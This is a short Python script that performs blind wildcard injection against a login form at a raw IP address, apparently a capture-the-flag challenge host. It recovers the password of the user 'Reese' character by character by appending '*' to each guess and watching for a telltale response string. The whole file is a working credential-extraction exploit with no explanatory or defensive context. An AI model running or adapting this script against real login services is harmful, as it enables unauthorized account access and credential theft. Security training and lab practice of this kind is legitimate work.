#!/usr/bin/python3
import requests
import string
from time import sleep

url = "http://165.22.123.158:32638/login"
alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

username = 'Reese'
password = ''



done = False

while (not done):
	done = True
	for i in alphabet:
		data = {'username':username, 'password':password + i + '*'}
		r = requests.post(url, data=data)

		if "No search results." in r.text:
			password += i
			print(password)
			done = False
			break

print("Password found: " + password)